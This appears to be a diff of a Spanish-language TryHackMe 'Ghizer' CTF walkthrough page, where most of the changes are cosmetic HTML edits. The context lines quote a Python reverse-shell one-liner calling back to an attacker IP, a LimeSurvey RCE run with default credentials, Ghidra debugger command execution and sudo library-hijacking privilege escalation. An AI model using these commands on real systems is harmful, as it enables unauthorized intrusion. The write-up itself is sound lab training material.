@@ -1257,7 +1257,7 @@
     <meta property="twitter:description" content="Walkthrough :: Writeups de rooms y maquinas de TryHackMe, HackTheBox y CTFs, en español">
   
 
-<meta name="generator" content="Hugo 0.79.1" />
+<meta name="generator" content="Hugo 0.68.3" />
 <meta name="msapplication-TileColor" content="#1d1d1d">
 
 <meta name="theme-color" content="#1d1d1d">
@@ -1578,15 +1578,15 @@
   🏷️
   
 
-  <li><a href="https://sckull.github.io/tags/python-library-hijacking/" class="single__tag" title="python library hijacking">#python library hijacking</a></li>
-
   <li><a href="https://sckull.github.io/tags/ftp/" class="single__tag" title="ftp">#ftp</a></li>
 
-  <li><a href="https://sckull.github.io/tags/limesurvey/" class="single__tag" title="LimeSurvey">#LimeSurvey</a></li>
+  <li><a href="https://sckull.github.io/tags/python-library-hijacking/" class="single__tag" title="python library hijacking">#python library hijacking</a></li>
 
   <li><a href="https://sckull.github.io/tags/ghidra/" class="single__tag" title="ghidra">#ghidra</a></li>
 
   <li><a href="https://sckull.github.io/tags/jdb/" class="single__tag" title="jdb">#jdb</a></li>
+
+  <li><a href="https://sckull.github.io/tags/limesurvey/" class="single__tag" title="LimeSurvey">#LimeSurvey</a></li>
 
 </ul>
     </div>
@@ -1632,7 +1632,7 @@
 </tr>
 </tbody>
 </table>
-<h2 id="nmap">NMAP</h2>
+<h2 id="nmap-">NMAP</h2>
 <p>Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), http (80), ssl/https (443), servicio de java(?) (18002) y algunos otros puertos abiertos que no logramos obtener informacion.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1894,7 +1894,7 @@ SF:<span class="o">(</span>X11Probe,58,<span class="s2">&#34;220\x20Welcome\x20t
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 </code></pre></td></tr></table>
 </div>
-</div><h2 id="ftp">FTP</h2>
+</div><h2 id="ftp-">FTP</h2>
 <p>Ingresamos por el servicio FTP con las credenciales de anonymous (anonymous:anonymous) en el cual encontramos varios archivos entre ellos las flag <code>root.txt</code> y <code>user.txt</code>, al intentar obtener uno de estos archivos muestra un mensaje de permiso denegado por lo que no logramos hacer nada en este servicio, además es muy raro porque comunmente es posible realizar <code>ls -lah</code> para observar los archivos ocultos, algo que no se pudo lograr en este servicio.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1970,10 +1970,10 @@ ftp&gt; bye
 kali@kali:~/thm/ghizer$
 </code></pre></td></tr></table>
 </div>
-</div><h2 id="http">HTTP</h2>
+</div><h2 id="http-">HTTP</h2>
 <p>Encontramos una pagina web en el puerto 80, al parecer es una aplicacion web para realizar encuestas.<br />
 <img src="/images/posts/thm/ghizer/Screenshot_2020-08-14_02-30-16.png" alt="image" /></p>
-<h2 id="gobuster">GOBUSTER</h2>
+<h2 id="gobuster-">GOBUSTER</h2>
 <p>Utilizamos gobuster para busqueda de directorios y archivos.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -2013,7 +2013,7 @@ kali@kali:~/thm/ghizer$
 /server-status <span class="o">(</span>Status: 403<span class="o">)</span>
 </code></pre></td></tr></table>
 </div>
-</div><h2 id="limesurvey---rce">LimeSurvey - RCE</h2>
+</div><h2 id="limesurvey---rce-">LimeSurvey - RCE</h2>
 <p>Encontramos un exploit que afecta a esta aplicacion la cual necesita unas credenciales para subir una shell y ejecutar comandos, utilizamos las credenciales por defecto y ejecutamos el exploit con los parametros necesarios. Vemos que el usuario que esta ejecutando la aplicacion es <code>www-data</code>.<br />
 <img src="/images/posts/thm/ghizer/Screenshot_2020-08-14_02-35-02.png" alt="image" /></p>
 <p>Actualizamos a una nueva shell en donde podamos realizar una enumeracion más comoda ejecutando una shell inversa de python.</p>
@@ -2025,7 +2025,7 @@ kali@kali:~/thm/ghizer$
 <pre class="chroma"><code class="language-bash" data-lang="bash">python -c <span class="s1">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.2.29.162&#34;,1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;</span>
 </code></pre></td></tr></table>
 </div>
-</div><h2 id="ghidra-rce---veronica">GHIDRA RCE -&gt; VERONICA</h2>
+</div><h2 id="ghidra-rce---veronica-">GHIDRA RCE -&gt; VERONICA</h2>
 <p>Realizamos una enumeracion en la maquina y vemos que en el directorio principal de la usuario <code>veronica</code> esta <code>Ghidra</code>, además de ello vemos los puertos abiertos en la maquina (ojo con 18001).<br />
 <img src="/images/posts/thm/ghizer/Screenshot_2020-08-14_02-38-15.png" alt="image" /><br />
 <img src="/images/posts/thm/ghizer/Screenshot_2020-08-14_02-47-45.png" alt="image" /></p>
@@ -2055,7 +2055,7 @@ print new java.lang.Runtime<span class="o">()</span>.exec<span class="o">(</span
 </div><p><img src="/images/posts/thm/ghizer/Screenshot_2020-08-14_03-20-39.png" alt="image" /></p>
 <p>Logramos obtener nuestra flag <code>user.txt</code> y una shell con la usuario <code>Veronica</code>.<br />
 <img src="/images/posts/thm/ghizer/Screenshot_2020-08-14_03-36-14.png" alt="image" /></p>
-<h2 id="privilege-escalation">PRIVILEGE ESCALATION</h2>
+<h2 id="privilege-escalation-">PRIVILEGE ESCALATION</h2>
 <p>Hacemos una pequeña enumeracion en la carpeta principal de <code>veronica</code> y vemos un script en python el cual codifica el mensaje <code>tryhackme is the best</code> y además la variable podria darnos una pista de lo que debemos de hacer.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -2138,7 +2138,7 @@ print new java.lang.Runtime<span class="o">()</span>.exec<span class="o">(</span
 </div>
 </div><p>Ejecutamos el script con python3 y sudo, ponemos a la escucha netcat en nuestra maquina y logramos obtener una shell con usuario root y nuestra flag <code>root.txt</code>.<br />
 <img src="/images/posts/thm/ghizer/Screenshot_2020-08-14_02-59-33.png" alt="image" /></p>
-<h2 id="honeypot---ftp">HONEYPOT - FTP</h2>
+<h2 id="honeypot---ftp-">HONEYPOT - FTP</h2>
 <p>Al parecer el servicio FTP expuesto en la maquina es un honeypot llamado <a href="https://github.com/Kirari-Senpai/Lucrecia.git"><strong>Lucrecia</strong></a>.<br />
 <img src="/images/posts/thm/ghizer/Screenshot_2020-08-14_03-02-18.png" alt="image" /></p>
 <p>Además el cron que encontramos era para ejecutar el honeypot.</p>
@@ -2158,7 +2158,7 @@ sleep <span class="m">3</span>
 python3 lucrecia.py -f server.conf
 </code></pre></td></tr></table>
 </div>
-</div><h2 id="task-1">TASK 1</h2>
+</div><h2 id="task-1-">TASK 1</h2>
 <p>Al obtener una shell es posible obtener las credenciales en &hellip;<br />
 <div class="alert alert-danger" role="alert" data-dir="ltr"><strong>SPOILER</strong></div>
 </p>
@@ -2318,7 +2318,7 @@ cat config.php
 </div>
   </div>
 </div>
-<h2 id="task-2">TASK 2</h2>
+<h2 id="task-2-">TASK 2</h2>
 <p>En el puerto 443 o https encontramos un mensaje en el index, donde indica que la pagina del login de wordpress ha sido escondida con el plugin <code>WPS Hide Login</code> &hellip;<br />
 <div class="alert alert-danger" role="alert" data-dir="ltr"><strong>SPOILER</strong></div>
 </p>
@@ -3688,7 +3688,7 @@ document.addEventListener('DOMContentLoaded', function () {
             <p class="caption">
                 
                     
-                        ©2020, All Rights Reserved
+                        ©2021, All Rights Reserved
                     
                 
             </p>
@@ -3736,16 +3736,16 @@ document.addEventListener('DOMContentLoaded', function () {
             <li><a href="#informacion-de-la-maquina">Informacion de la Maquina</a></li>
           </ul>
         </li>
-        <li><a href="#nmap">NMAP</a></li>
-        <li><a href="#ftp">FTP</a></li>
-        <li><a href="#http">HTTP</a></li>
-        <li><a href="#gobuster">GOBUSTER</a></li>
-        <li><a href="#limesurvey---rce">LimeSurvey - RCE</a></li>
-        <li><a href="#ghidra-rce---veronica">GHIDRA RCE -&gt; VERONICA</a></li>
-        <li><a href="#privilege-escalation">PRIVILEGE ESCALATION</a></li>
-        <li><a href="#honeypot---ftp">HONEYPOT - FTP</a></li>
-        <li><a href="#task-1">TASK 1</a></li>
-        <li><a href="#task-2">TASK 2</a></li>
+        <li><a href="#nmap-">NMAP</a></li>
+        <li><a href="#ftp-">FTP</a></li>
+        <li><a href="#http-">HTTP</a></li>
+        <li><a href="#gobuster-">GOBUSTER</a></li>
+        <li><a href="#limesurvey---rce-">LimeSurvey - RCE</a></li>
+        <li><a href="#ghidra-rce---veronica-">GHIDRA RCE -&gt; VERONICA</a></li>
+        <li><a href="#privilege-escalation-">PRIVILEGE ESCALATION</a></li>
+        <li><a href="#honeypot---ftp-">HONEYPOT - FTP</a></li>
+        <li><a href="#task-1-">TASK 1</a></li>
+        <li><a href="#task-2-">TASK 2</a></li>
       </ul>
     </li>
   </ul>
